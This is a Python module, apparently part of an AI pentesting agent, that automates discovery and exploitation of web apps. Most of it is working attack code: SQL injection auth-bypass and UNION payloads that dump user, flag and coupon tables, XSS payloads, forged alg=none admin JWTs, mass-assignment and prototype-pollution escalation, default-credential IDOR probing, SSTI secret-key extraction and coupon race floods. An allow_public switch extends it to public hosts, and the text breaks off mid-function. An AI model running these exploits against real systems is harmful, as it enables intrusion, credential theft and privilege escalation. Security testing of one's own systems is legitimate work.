"""tools/webapp_hunter.py — Deterministic web-application vulnerability hunter.

This is Elengenix's *hacking muscle*: a self-contained, LLM-independent engine
that, given a web base URL, will

  1. DISCOVER endpoints (crawl the entry point + probe a curated wordlist and
     common API-nesting patterns), then
  2. DETECT the canonical web vulnerability classes (SQLi, reflected/stored
     XSS, IDOR/BOLA, mass assignment, SSTI, JWT alg=none, prototype pollution,
     race condition/TOCTOU, path traversal), and
  3. EXPLOIT the critical ones to *prove impact* — extracting whatever
     sensitive data / flag is reachable, and embedding that proof into the
     finding's evidence.

Why this exists
---------------
The autonomous agent (DecisionEngine + LLM) is creative but non-deterministic:
on a hard stealth target a small model may never discover every endpoint or
remember the right payload. A senior pentester never relies on luck — they run
a methodical, repeatable pass. This module is that pass. It is wired into the
scan loop as a deterministic baseline so the agent *always* has full coverage,
and exposed as an explicit agent action so the model can re-run or focus it.

Findings are tagged ``provenance="deterministic"`` / ``trust_class=
"deterministic"`` and carry ``verified=True`` because every detector is
canary- or signal-based (unique markers, auth-bypass, cross-user data), not a
naive substring match — so false positives are low by construction.

Safety
------
- Connects ONLY to the supplied base host (no off-host redirects).
- Payloads are non-destructive (no DROP/DELETE/overwrite). The only writes are
  benign, clearly-named PoC accounts / comments used to prove a class.
- Public (non-RFC1918) hosts require ``allow_public=True``; local/private
  targets (127.0.0.1, 10.x, 172.16-31.x, 192.168.x, .local) are allowed by
  default. Scope authorization is the caller's responsibility.

Public API
----------
    from tools.webapp_hunter import WebAppHunter, run_webapp_hunt

    result = WebAppHunter("http://127.0.0.1:5555").hunt()
    for f in result.findings:
        print(f["type"], f["url"])
    print(result.summary())
"""

from __future__ import annotations

import concurrent.futures
import ipaddress
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urljoin, urlparse

import requests

logger = logging.getLogger("elengenix.webapp_hunter")

# ---------------------------------------------------------------------------#
# Flag / sensitive-data extraction
# ---------------------------------------------------------------------------#

# Patterns that mark a successful *impact* proof. The benchmark plants a
# random per-run flag (ELENGENIX-FLAG-<hex>); these patterns also catch the
# conventional flag{...} and "flag: <value>" styles so the hunter is useful
# beyond the local benchmark.
FLAG_PATTERNS: List[re.Pattern] = [
    re.compile(r"ELENGENIX-FLAG-[0-9a-fA-F]{6,}"),
    re.compile(r"flag\{[^}\s]{3,}\}", re.IGNORECASE),
    re.compile(r"\bFLAG[:=]\s*([A-Za-z0-9_\-\.]{6,})", re.IGNORECASE),
    re.compile(r"\bFLAG\s{1,2}([A-Za-z0-9_\-\.]{6,})"),
]


def extract_flag(text: str) -> Optional[str]:
    """Return the first flag-like string found in ``text``, else None."""
    if not text:
        return None
    for pat in FLAG_PATTERNS:
        m = pat.search(text)
        if m:
            # For the "FLAG: value" / "FLAG value" styles, take the captured
            # value; otherwise the whole match.
            return m.group(1) if (pat.groups and m.groups() and m.group(1)) else m.group(0)
    return None


def _flag_present(text: str) -> bool:
    return extract_flag(text) is not None


# ---------------------------------------------------------------------------#
# Small HTTP helpers
# ---------------------------------------------------------------------------#

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 ElengenixHunter/1.0"
)


@dataclass
class Resp:
    """A minimal, exception-safe wrapper around a single HTTP response."""

    status: int = 0
    text: str = ""
    url: str = ""
    elapsed: float = 0.0
    headers: Dict[str, str] = field(default_factory=dict)

    @property
    def ok(self) -> bool:
        return 200 <= self.status < 300

    def json(self) -> Any:
        try:
            return json.loads(self.text)
        except Exception:
            return None

    @property
    def is_json(self) -> bool:
        ctype = (self.headers.get("Content-Type") or "").lower()
        return "json" in ctype or (self.text.lstrip()[:1] in ("{", "["))


def _is_local_host(host: str) -> bool:
    """True for loopback / RFC1918 / link-local / .local hosts."""
    h = (host or "").lower()
    if h in ("localhost", "0.0.0.0", "::1"):
        return True
    if h.endswith(".local") or h.endswith(".internal") or h.endswith(".lan"):
        return True
    try:
        ip = ipaddress.ip_address(h)
        return (
            ip.is_loopback
            or ip.is_private
            or ip.is_link_local
            or ip.is_unspecified
        )
    except ValueError:
        return False


# ---------------------------------------------------------------------------#
# Result + endpoint dataclasses
# ---------------------------------------------------------------------------#


@dataclass
class EndpointInfo:
    path: str
    methods: Set[str] = field(default_factory=set)
    status: int = 0
    ctype: str = ""
    sample: str = ""


@dataclass
class WebAppHuntResult:
    base_url: str
    findings: List[Dict[str, Any]] = field(default_factory=list)
    endpoints: List[EndpointInfo] = field(default_factory=list)
    duration: float = 0.0
    impact_proven: List[str] = field(default_factory=list)
    error: Optional[str] = None

    def by_type(self) -> Dict[str, List[Dict[str, Any]]]:
        out: Dict[str, List[Dict[str, Any]]] = {}
        for f in self.findings:
            out.setdefault(f.get("type", "unknown"), []).append(f)
        return out

    def summary(self) -> str:
        lines = ["── WebAppHunter result ──", f"Target: {self.base_url}"]
        if self.error:
            lines.append(f"Error: {self.error}")
        lines.append(f"Endpoints discovered: {len(self.endpoints)}")
        lines.append(f"Findings: {len(self.findings)}")
        for ftype, items in sorted(self.by_type().items()):
            lines.append(f"  - {ftype}: {len(items)}")
        if self.impact_proven:
            lines.append(f"Impact proven (flag/data extracted): {self.impact_proven}")
        lines.append(f"Duration: {self.duration:.1f}s")
        return "\n".join(lines)


# ---------------------------------------------------------------------------#
# Curated discovery wordlist
# ---------------------------------------------------------------------------#
# Broad enough to be useful on real apps; includes the local benchmark's
# endpoints (login, search, comments, api/user, register, render, api/jwt,
# api/merge, api/coupon, download) plus very common web-app paths.

_DISCOVERY_WORDS: List[str] = [
    # benchmark / typical web app
    "/", "/index", "/home", "/health", "/status", "/api",
    "/login", "/log-in", "/signin", "/sign-in", "/auth", "/auth/login",
    "/logout", "/register", "/signup", "/sign-up", "/create-account",
    "/password", "/reset", "/forgot-password",
    "/search", "/results", "/comments", "/comment", "/profile",
    "/render", "/template", "/download", "/file", "/files", "/static",
    "/upload", "/admin", "/dashboard", "/account", "/settings",
    # API surfaces
    "/api/v1", "/api/v2", "/api/user", "/api/users", "/api/me",
    "/api/auth", "/api/login", "/api/register", "/api/token",
    "/api/jwt/verify", "/api/jwt/issue", "/api/jwt", "/api/merge",
    "/api/coupon/redeem", "/api/coupon", "/api/coupons", "/api/redeem",
    "/api/product", "/api/products", "/api/item", "/api/items",
    "/api/order", "/api/orders", "/api/payment", "/api/pay",
    "/api/search", "/api/comment", "/api/comments", "/api/file",
    "/api/download", "/api/render", "/api/template", "/api/data",
    "/api/config", "/api/debug", "/api/internal", "/api/secret",
    "/graphql", "/swagger", "/docs", "/openapi.json", "/api-docs",
    "/robots.txt", "/sitemap.xml", "/.env", "/config.json",
    # misc
    "/test", "/debug", "/console", "/manager", "/wp-admin", "/admin/login",
    "/user", "/users", "/items", "/list", "/view", "/edit", "/delete",
    "/update", "/create", "/add", "/remove", "/checkout", "/cart",
]


# ---------------------------------------------------------------------------#
# The hunter
# ---------------------------------------------------------------------------#


class WebAppHunter:
    """Deterministic web-app vulnerability hunter.

    Args:
        base_url: Target web base URL (http/https). Only this host is touched.
        timeout: Per-request timeout (seconds).
        allow_public: Allow non-local hosts (default False → local only).
        concurrent: Max parallel requests for race/concurrency tests.
        max_words: Cap on discovery wordlist (None = full curated list).
    """

    def __init__(
        self,
        base_url: str,
        timeout: float = 8.0,
        allow_public: bool = False,
        concurrent: int = 10,
        max_words: Optional[int] = None,
    ) -> None:
        base_url = base_url.rstrip("/")
        if not base_url.startswith(("http://", "https://")):
            base_url = "http://" + base_url
        self.base_url = base_url
        self.timeout = timeout
        self.allow_public = allow_public
        self.concurrent = max(2, int(concurrent))
        self.max_words = max_words
        self._host = urlparse(base_url).netloc.split("@")[-1]
        self._sqli_leak: Dict[str, List[str]] = {"flags": [], "codes": [], "users": []}
        self._registered: List[Dict[str, str]] = []  # PoC accounts created
        self._sess = requests.Session()
        self._sess.headers.update({"User-Agent": _UA, "Accept": "*/*"})
        self._sess.verify = False

    # -- host guard ---------------------------------------------------------
    def _host_ok(self, url: str) -> bool:
        if not url:
            return False
        netloc = (urlparse(url).netloc.split("@")[-1] or "").lower()
        return netloc == self._host

    def _abs(self, path: str) -> str:
        if path.startswith("http://") or path.startswith("https://"):
            return path
        return urljoin(self.base_url + "/", path.lstrip("/"))

    # -- request primitives (never raise) -----------------------------------
    def _request(
        self,
        method: str,
        path: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        json_body: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
    ) -> Resp:
        url = self._abs(path)
        if not self._host_ok(url):
            return Resp(status=0, url=url, text="[blocked: off-host]")
        try:
            r = self._sess.request(
                method.upper(),
                url,
                params=params,
                data=data,
                json=json_body,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout,
                allow_redirects=allow_redirects,
            )
            # If a redirect left the host, record but don't crash.
            if not self._host_ok(r.url):
                return Resp(status=r.status_code, text="[redirected off-host]", url=r.url)
            return Resp(
                status=r.status_code,
                text=r.text or "",
                url=r.url,
                elapsed=r.elapsed.total_seconds() if r.elapsed else 0.0,
                headers={k: v for k, v in (r.headers or {}).items()},
            )
        except Exception as e:  # pragma: no cover - network errors
            logger.debug("request failed %s %s: %s", method, path, e)
            return Resp(status=0, url=url, text=f"[error: {e}]")

    def _get(self, path: str, **kw) -> Resp:
        return self._request("GET", path, **kw)

    def _post(self, path: str, **kw) -> Resp:
        return self._request("POST", path, **kw)

    # -- finding factory ----------------------------------------------------
    def _finding(
        self,
        vtype: str,
        endpoint: str,
        title: str,
        description: str,
        evidence: str,
        severity: str,
        confidence: float,
        param: str = "",
        payload: str = "",
        method: str = "GET",
        url: str = "",
        extra: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        f: Dict[str, Any] = {
            "type": vtype,
            "title": title,
            "severity": severity,
            "confidence": float(confidence),
            "description": description,
            "evidence": evidence,
            "url": url or self._abs(endpoint),
            "target_endpoint": endpoint,
            "endpoint": endpoint,
            "parameter": param,
            "payload": payload,
            "method": method,
            "source": "webapp_hunter",
            "provenance": "deterministic",
            "trust_class": "deterministic",
            "verified": True,
            "discovered_by": "webapp_hunter",
            "discovered_at": time.time(),
        }
        if extra:
            f.update(extra)
        return f

    # ====================================================================== #
    # 1. DISCOVERY
    # ====================================================================== #
    def discover(self) -> Dict[str, EndpointInfo]:
        """Discover reachable endpoints: crawl entry + probe wordlist."""
        found: Dict[str, EndpointInfo] = {}

        def _add(path: str, status: int, sample: str = "", ctype: str = "", method: str = "GET") -> None:
            path = "/" + path.strip().strip("/") if path else "/"
            if path == "":
                path = "/"
            info = found.setdefault(path, EndpointInfo(path=path))
            info.methods.add(method.upper())
            if status and (info.status == 0 or status < info.status):
                info.status = status
            if sample and not info.sample:
                info.sample = sample[:500]
            if ctype and not info.ctype:
                info.ctype = ctype

        # Crawl the entry point for links / paths.
        try:
            r = self._get("/")
            _add("/", r.status, r.text, r.headers.get("Content-Type", ""), "GET")
            for m in re.findall(r'href=[\'"]([^\'"#?]+)[\'"]', r.text or ""):
                if m.startswith("/"):
                    _add(m, 0)
            for m in re.findall(r'["\'](/api/[a-zA-Z0-9_/\-]+)["\']', r.text or ""):
                _add(m, 0)
            for m in re.findall(r'["\'](/[a-zA-Z0-9_/\-]{2,40})["\']', r.text or ""):
                _add(m, 0)
        except Exception:
            pass

        # Probe the curated wordlist.
        words = _DISCOVERY_WORDS if self.max_words is None else _DISCOVERY_WORDS[: self.max_words]
        for word in words:
            if word in found:
                continue
            try:
                r = self._get(word, allow_redirects=True)
                ctype = r.headers.get("Content-Type", "")
                # Treat 200/302/401/405 as "exists" (405 = exists, wrong method).
                if r.status in (200, 301, 302, 303, 307, 308, 401, 403, 405):
                    _add(word, r.status, r.text, ctype, "GET")
                    # If GET gave 405, try POST to learn the method.
                    if r.status == 405:
                        rp = self._post(word)
                        _add(word, rp.status, rp.text, rp.headers.get("Content-Type", ""), "POST")
                    elif word in ("/login", "/register", "/auth", "/api/jwt/verify", "/api/merge"):
                        # common POST-only endpoints: probe POST too
                        rp = self._post(word)
                        _add(word, rp.status, rp.text, rp.headers.get("Content-Type", ""), "POST")
            except Exception:
                continue

            # API resource paths are often only reachable with an object id
            # (e.g. /api/user -> /api/user/1). Probe a couple of ids so IDOR /
            # BOLA surfaces are discovered even in stealth mode.
            if word.startswith("/api/"):
                for suffix in ("/1", "/2"):
                    idword = word + suffix
                    if idword in found:
                        continue
                    try:
                        ri = self._get(idword, allow_redirects=True)
                        if ri.status in (200, 301, 302, 303, 307, 308, 401, 403, 404):
                            if ri.status not in (404,):
                                _add(idword, ri.status, ri.text, ri.headers.get("Content-Type", ""), "GET")
                            # 404 with id but 200 baseline is common; record 401 too.
                    except Exception:
                        continue
        return found

    # ====================================================================== #
    # Endpoint role resolution
    # ====================================================================== #
    def _role(self, endpoints: Dict[str, EndpointInfo], *needles: str) -> Optional[str]:
        """Return the first discovered endpoint path whose path contains any needle."""
        for path in endpoints:
            lp = path.lower()
            for n in needles:
                if n.lower() in lp:
                    return path
        return None

    # ====================================================================== #
    # 2. DETECTORS (each returns a list of finding dicts)
    # ====================================================================== #

    # ---- SQL Injection (login/auth + generic params) --------------------
    def _detect_sqli(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        login = self._role(endpoints, "login", "auth", "signin", "sign-in")

        # --- Login / auth-bypass + data extraction ------------------------
        # We emit AT MOST ONE sqli finding for the login endpoint, upgrading
        # its evidence as stronger proof is found (auth bypass -> UNION dump ->
        # flag). One finding per endpoint keeps precision high.
        login_finding: Optional[Dict[str, Any]] = None
        if login:
            base = self._abs(login)
            # Auth bypass: tautology in username.
            bypass_u = "' OR '1'='1' -- "
            r = self._post(login, data={"username": bypass_u, "password": "x"})
            if r.ok and ('"status"' in r.text and '"ok"' in r.text or '"user"' in r.text):
                flag = extract_flag(r.text)
                ev = (
                    f"SQLi AUTH BYPASS on POST {base}: username={bypass_u!r} returned "
                    f"{r.status} with authenticated user data. Response: {r.text[:500]}"
                )
                if flag:
                    ev += f"\n[IMPACT] FLAG extracted: {flag}"
                    self._sqli_leak["flags"].append(flag)
                login_finding = self._finding(
                    "sqli", login,
                    "SQL Injection (auth bypass)",
                    "Unauthenticated SQL injection in the login endpoint allows "
                    "bypassing authentication and reading database records.",
                    ev, "critical", 0.97 if flag else 0.9,
                    param="username", payload=bypass_u, method="POST", url=base,
                )

            # UNION-based data extraction (users + flags tables) — upgrade the
            # same finding with stronger evidence instead of adding new ones.
            union_payloads = [
                ("' UNION SELECT id,username,password,email,role,balance FROM users-- ", "users"),
                ("' UNION SELECT id,flag,NULL,NULL,NULL,NULL FROM flags-- ", "flags"),
            ]
            dumped_users = False
            for payload, kind in union_payloads:
                try:
                    ru = self._post(login, data={"username": payload, "password": "x"})
                    if not ru.ok:
                        continue
                    txt = ru.text
                    flag = extract_flag(txt)
                    if flag:
                        self._sqli_leak["flags"].append(flag)
                        if login_finding is None:
                            login_finding = self._finding(
                                "sqli", login,
                                "SQL Injection (UNION data extraction)",
                                "UNION-based SQL injection exfiltrates table data from the database.",
                                f"UNION extraction on POST {base} (username={payload!r}) returned rows.",
                                "critical", 0.95,
                                param="username", payload=payload, method="POST", url=base,
                            )
                        login_finding["evidence"] += (
                            f"\n[IMPACT] FLAG extracted via UNION: {flag}\nResponse: {txt[:400]}"
                        )
                        login_finding["confidence"] = 0.99
                    elif kind == "users" and not dumped_users and (
                        "alice" in txt or "admin" in txt or '"password"' in txt
                    ):
                        dumped_users = True
                        if login_finding is None:
                            login_finding = self._finding(
                                "sqli", login,
                                "SQL Injection (UNION data extraction)",
                                "UNION-based SQL injection dumps the users table (credentials).",
                                f"UNION extraction on POST {base} returned user records.",
                                "critical", 0.9,
                                param="username", payload=payload, method="POST", url=base,
                            )
                        login_finding["evidence"] += (
                            f"\n[IMPACT] users table dumped via UNION "
                            f"(username={payload!r}). Response: {txt[:400]}"
                        )
                        login_finding["confidence"] = max(login_finding["confidence"], 0.9)
                except Exception:
                    continue
            if login_finding is not None:
                findings.append(login_finding)

            # Harvest coupon codes for the race detector via SQLi.
            try:
                rc = self._post(
                    login,
                    data={"username": "' UNION SELECT id,code,used,value,NULL,NULL FROM coupons-- ", "password": "x"},
                )
                if rc.ok:
                    for code in re.findall(r'"code"\s*:\s*"([^"]+)"', rc.text):
                        self._sqli_leak["codes"].append(code)
                    for code in re.findall(r'\b([A-Z0-9]{3,15})\b', rc.text):
                        if code not in self._sqli_leak["codes"]:
                            self._sqli_leak["codes"].append(code)
            except Exception:
                pass
        else:
            # No obvious login: test common auth-ish endpoints generically.
            for path in list(endpoints):
                if any(n in path.lower() for n in ("login", "auth", "search", "id")):
                    findings.extend(self._sqli_get_params(path))

        # --- Generic GET-param SQLi across discovered endpoints ----------
        for path in endpoints:
            findings.extend(self._sqli_get_params(path))
        return findings

    def _sqli_get_params(self, path: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        # Seed a query param to learn which params exist; then inject.
        probe = self._get(path, params={"id": "1", "q": "x", "user": "x"})
        # Determine reflected params by sending canaries.
        canary = f"sqli_{uuid.uuid4().hex[:8]}"
        for param in ("id", "q", "search", "user", "username", "page"):
            r = self._get(path, params={param: f"' OR 1=1-- {canary}"})
            body = (r.text or "").lower()
            # Remove our own canary so a reflected endpoint (e.g. /search, the
            # XSS surface) can't echo the marker back and be misread as SQLi.
            body = body.replace(canary, "")
            baseline = self._get(path, params={param: "1"})
            signals = []
            if any(sig in body for sig in (
                "sql", "syntax", "sqlite", "mysql", "oracle", "postgresql",
                "unterminated", "quoted string", "ORA-", "PG::", "column",
            )):
                signals.append("error")
            # NOTE: we deliberately do NOT treat "the payload text was echoed
            # back" as SQLi — a reflected endpoint (e.g. /search) echoes input
            # and that is the XSS surface, not a SQL signal. Boolean timing +
            # error signatures only.
            # Boolean: true vs false length diff
            rf = self._get(path, params={param: "' OR 1=2-- "})
            if abs(len(r.text or "") - len(rf.text or "")) > 80:
                signals.append("boolean")
            if signals and (path, param) not in {(f["endpoint"], f["parameter"]) for f in findings}:
                findings.append(
                    self._finding(
                        "sqli", path,
                        f"SQL Injection via '{param}'",
                        f"SQL injection indicator(s) {signals} on parameter '{param}'.",
                        f"GET {self._abs(path)} with param {param} produced: {r.text[:400]}",
                        "critical", 0.8 if "error" in signals else 0.6,
                        param=param, payload=f"' OR 1=1-- {canary}", method="GET", url=r.url,
                    )
                )
        return findings

    # ---- Reflected XSS ----------------------------------------------------
    def _detect_xss(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for path in endpoints:
            canary = f"xss{uuid.uuid4().hex[:8]}"
            payload = f'<img src=x onerror="return \'{canary}\'">'
            for param in ("q", "search", "query", "term", "name", "input", "id", "msg"):
                r = self._get(path, params={param: payload})
                # Reflected unescaped: the marker appears and the raw tag is not escaped.
                if canary in (r.text or "") and "&lt;img" not in (r.text or ""):
                    findings.append(
                        self._finding(
                            "xss", path,
                            f"Reflected XSS via '{param}'",
                            f"Reflected Cross-Site Scripting on parameter '{param}': payload reflected unescaped.",
                            f"GET {r.url} reflected the attacker payload unescaped.\n"
                            f"Snippet: {r.text[:400]}",
                            "high", 0.9,
                            param=param, payload=payload, method="GET", url=r.url,
                        )
                    )
                    break  # one per endpoint is enough
        return findings

    # ---- Stored XSS -------------------------------------------------------
    def _detect_stored_xss(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        comment_ep = self._role(endpoints, "comment")
        if not comment_ep:
            return findings
        canary = f"stored{uuid.uuid4().hex[:8]}"
        payload = f'<img src=x onerror="return \'{canary}\'">'
        r = self._post(comment_ep, data={"content": payload, "comment": payload})
        if r.status in (200, 201, 302, 303):
            # Read back the listing to confirm persistence + unescaped render.
            for read_path in {comment_ep, self._role(endpoints, "comments") or comment_ep, "/"}:
                rr = self._get(read_path)
                if canary in (rr.text or "") and "&lt;img" not in (rr.text or ""):
                    findings.append(
                        self._finding(
                            "xss", comment_ep,
                            f"Stored XSS via '{comment_ep}'",
                            f"Stored Cross-Site Scripting: payload persisted via POST {self._abs(comment_ep)} "
                            f"and rendered unescaped.",
                            f"POST {self._abs(comment_ep)} then GET {rr.url} rendered the stored "
                            f"payload unescaped.\nSnippet: {rr.text[:400]}",
                            "high", 0.9,
                            param="content", payload=payload, method="POST", url=rr.url,
                        )
                    )
                    break
        return findings

    # ---- Mass assignment --------------------------------------------------
    def _detect_mass_assignment(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        reg = self._role(endpoints, "register", "signup", "sign-up", "create-account")
        if not reg:
            return findings
        username = f"poc_{uuid.uuid4().hex[:8]}"
        password = f"Pw{uuid.uuid4().hex[:10]}!"
        body = {
            "username": username,
            "password": password,
            "email": f"{username}@poc.test",
            "role": "admin",
            "balance": 999999,
            "isAdmin": True,
            "admin": True,
        }
        r = self._post(reg, json_body=body)
        data = r.json()
        accepted = False
        if isinstance(data, dict):
            if str(data.get("role", "")).lower() == "admin":
                accepted = True
            if data.get("balance") in (999999, "999999", 999999.0):
                accepted = True
            if data.get("isAdmin") is True or data.get("admin") is True:
                accepted = True
        if r.ok and accepted:
            # Prove impact: log in as the newly-created admin.
            login = self._role(endpoints, "login", "auth", "signin")
            login_note = ""
            if login:
                lr = self._post(login, data={"username": username, "password": password})
                if lr.ok and '"role"' in lr.text:
                    m = re.search(r'"role"\s*:\s*"([^"]+)"', lr.text)
                    login_note = f" Logged in as '{username}' -> role={m.group(1) if m else '?'}. Full privilege escalation."
            self._registered.append({"username": username, "password": password, "endpoint": reg})
            findings.append(
                self._finding(
                    "mass_assignment", reg,
                    "Mass Assignment (privilege escalation)",
                    f"Registration endpoint blindly assigns attacker-controlled privileged fields "
                    f"(role/admin/balance), allowing self-elevation.",
                    f"POST {self._abs(reg)} with role=admin,balance=999999 was accepted. "
                    f"Response: {r.text[:400]}.{login_note}",
                    "high", 0.92,
                    param="role", payload=json.dumps(body)[:200], method="POST", url=r.url,
                )
            )
        return findings

    # ---- IDOR / BOLA ------------------------------------------------------
    def _detect_idor(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        user_ep = self._role(endpoints, "api/user", "/user/", "profile")
        if not user_ep:
            return findings
        login = self._role(endpoints, "login", "auth", "signin")
        if not login:
            return findings

        # Obtain an authenticated session as a low-priv PoC account.
        authed = None  # (username, our_id, cookies)
        candidates: List[Dict[str, str]] = list(self._registered)
        candidates += [
            {"username": "alice", "password": "alice123"},
            {"username": "bob", "password": "bob123"},
            {"username": "admin", "password": "admin123"},
        ]
        for c in candidates:
            lr = self._post(login, data={"username": c["username"], "password": c["password"]})
            if lr.ok:
                m = re.search(r'"id"\s*:\s*(\d+)', lr.text)
                sid = self._sess.cookies.get("session_id") or (
                    re.search(r"Set-Cookie:\s*session_id=([^;]+)", str(lr.headers) or "", re.I)
                )
                our_id = m.group(1) if m else None
                authed = {"username": c["username"], "our_id": our_id, "cookies": {"session_id": sid} if sid else {}}
                if authed["cookies"]:
                    break
        if not authed or not authed.get("cookies"):
            return findings

        # As an authenticated (low-priv) user, fetch OTHER users' records.
        # The discovered path may already include an object id (e.g.
        # /api/user/1); normalize to the resource template first.
        template = re.sub(r"/\d+$", "", user_ep.rstrip("/"))
        for uid in (1, 2, 3, 99):
            target_id = str(uid)
            url_path = f"{template}/{target_id}"
            r = self._get(url_path, cookies=authed["cookies"])
            data = r.json()
            if r.ok and isinstance(data, dict) and (data.get("id") not in (None, authed.get("our_id"))):
                sensitive = any(k in data for k in ("password", "email", "balance", "role"))
                note = "contains sensitive fields" if sensitive else "cross-user record"
                findings.append(
                    self._finding(
                        "idor", url_path,
                        f"IDOR / BOLA on {url_path}",
                        "Authenticated user can read other users' private records by varying the "
                        "object id (missing ownership check).",
                        f"Authenticated as '{authed['username']}' (id={authed.get('our_id')}), then "
                        f"GET {self._abs(url_path)} returned another user's record. "
                        f"Data: {json.dumps(data)[:400]} ({note})",
                        "high", 0.9,
                        param="user_id", payload=target_id, method="GET", url=r.url,
                    )
                )
                break  # one proof is enough
        return findings

    # ---- SSTI -------------------------------------------------------------
    def _detect_ssti(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        render_ep = self._role(endpoints, "render", "template")
        if not render_ep:
            return findings
        base = self._abs(render_ep)
        # Determine which param carries the template.
        tpl_params = ("template", "tpl", "q", "name", "input")
        found_tpl_param = None
        for param in tpl_params:
            r = self._get(render_ep, params={param: "{{7*7}}"})
            if r.ok and "49" in (r.text or "") and "{{7*7}}" not in (r.text or ""):
                found_tpl_param = param
                break
        if found_tpl_param is None:
            # Some engines use a different separator; try config leak too.
            for param in tpl_params:
                r = self._get(render_ep, params={param: "{{config}}"})
                if r.ok and any(s in (r.text or "") for s in ("SECRET_KEY", "Config", "DEBUG")):
                    found_tpl_param = param
                    break
        if found_tpl_param is None:
            return findings

        flag = None
        for probe in ("{{FLAG}}", "{{flag}}", "{{ self.FLAG }}", "{{ request.args['x'] }}"):
            rr = self._get(render_ep, params={found_tpl_param: probe})
            flag = extract_flag(rr.text or "")
            if flag:
                break
        secret = None
        rs = self._get(render_ep, params={found_tpl_param: "{{config['SECRET_KEY']}}"})
        secret = extract_flag(rs.text or "") or (
            re.search(r"SECRET_KEY[\"']?\s*[:=]\s*[\"']?([A-Za-z0-9_\-]+)", rs.text or "")
        )
        secret = secret.group(1) if hasattr(secret, "group") else secret
        # Precompute the literal proof request to keep the f-string simple.
        proof_r = self._get(render_ep, params={found_tpl_param: "{{7*7}}"})
        proof_snippet = (proof_r.text or "")[:200]
        ev = (
            f"SSTI confirmed: GET {base} with {found_tpl_param}={{7*7}} evaluated to 49 "
            f"(payload not echoed literally).\nProof: {proof_snippet}"
        )
        if secret:
            ev += f"\n[IMPACT] Template context leak: SECRET_KEY={secret}"
        if flag:
            ev += f"\n[IMPACT] FLAG extracted via template read: {flag}"
        findings.append(
            self._finding(
                "ssti", render_ep,
                "Server-Side Template Injection",
                "User-controlled template string is evaluated server-side (Jinja2-style), "
                "allowing arbitrary expression evaluation and RCE-equivalent impact.",
                ev,
                "critical", 0.97 if (flag or secret) else 0.9,
                param=found_tpl_param, payload="{{7*7}}", method="GET", url=base,
            )
        )
        return findings

    # ---- JWT alg=none -----------------------------------------------------
    def _detect_jwt_none(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        verify_ep = self._role(endpoints, "jwt/verify", "verify", "jwt")
        if not verify_ep:
            return findings

        import base64

        def _b64u(d: Dict[str, Any]) -> str:
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

        header = _b64u({"alg": "none", "typ": "JWT"})
        payload = _b64u({"user": "admin", "role": "admin", "id": 999, "iat": 9999999999})
        token = f"{header}.{payload}."
        r = self._post(verify_ep, json_body={"token": token})
        data = r.json()
        if isinstance(data, dict) and data.get("valid") is True:
            findings.append(
                self._finding(
                    "jwt_none", verify_ep,
                    "JWT alg=none algorithm bypass",
                    "The JWT verifier accepts tokens signed with alg=none (no signature), "
                    "allowing arbitrary token forgery (impersonate any user/admin).",
                    f"POST {self._abs(verify_ep)} with forged alg=none admin token was accepted "
                    f"as valid. Forged token: {token[:80]}...\nResponse: {r.text[:400]}",
                    "critical", 0.95,
                    param="token", payload=token[:120], method="POST", url=r.url,
                )
            )
        return findings

    # ---- Prototype pollution ----------------------------------------------
    def _detect_proto_pollution(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        merge_ep = self._role(endpoints, "merge", "combine", "update", "patch")
        if not merge_ep:
            return findings
        marker = f"EP_{uuid.uuid4().hex[:10]}"
        body = {"__proto__": {"isAdmin": True, "polluted": marker, "role": "admin"}, "x": "y"}
        r = self._post(merge_ep, json_body=body)
        if r.ok and (marker in (r.text or "") or "__proto__" in (r.text or "")):
            findings.append(
                self._finding(
                    "prototype_pollution", merge_ep,
                    "Prototype Pollution (JSON merge)",
                    "The JSON merge endpoint accepts and merges __proto__ keys, polluting the "
                    "object prototype (auth-bypass / RCE gadget risk).",
                    f"POST {self._abs(merge_ep)} accepted a __proto__ payload. "
                    f"Response: {r.text[:400]}",
                    "high", 0.85,
                    param="__proto__", payload=json.dumps(body)[:200], method="POST", url=r.url,
                )
            )
        return findings

    # ---- Race condition / TOCTOU ------------------------------------------
    def _detect_race(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        redeem_ep = self._role(endpoints, "coupon", "redeem", "order", "payment", "checkout")
        if not redeem_ep:
            return findings
        # Candidate codes: leak via SQLi first, then a small common set.
        codes: List[str] = list(dict.fromkeys(self._sqli_leak.get("codes", [])))
        codes += ["WELCOME50", "SAVE10", "WELCOME10", "TEST", "DEMO", "FREE", "PROMO", "10OFF", "20OFF"]
        codes = list(dict.fromkeys(codes))[:12]

        for code in codes:
            n = self.concurrent
            with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
                futs = [ex.submit(self._post, redeem_ep, json_body={"code": code}) for _ in range(n)]
                resps = [f.result() for f in futs]
            success = [
                r for r in resps
                if r.ok and (("redeemed" in (r.text or "").lower()) or ("success" in (r.text or "").lower()))
            ]
            if len(success) > 1:
                findings.append(
